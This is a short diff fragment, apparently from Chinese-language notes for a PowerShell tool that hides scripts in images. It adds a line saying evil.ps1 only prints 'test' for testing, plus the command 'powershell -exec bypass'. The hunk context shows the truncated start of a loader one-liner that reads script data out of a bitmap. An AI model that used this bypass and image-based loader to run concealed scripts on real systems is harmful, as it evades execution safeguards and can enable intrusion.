@@ -62,4 +62,11 @@ sal a New-Object;Add-Type -AssemblyName "System.Drawing";$g=a System.Drawing.Bit
 
 
 
+evil.ps1 为我写的一个在powershell中输出 test 的小脚本，用于测试使用
+
+```$powershell -exec bypass```   # 在 cmd 执行powershell
+
+
+
+
 
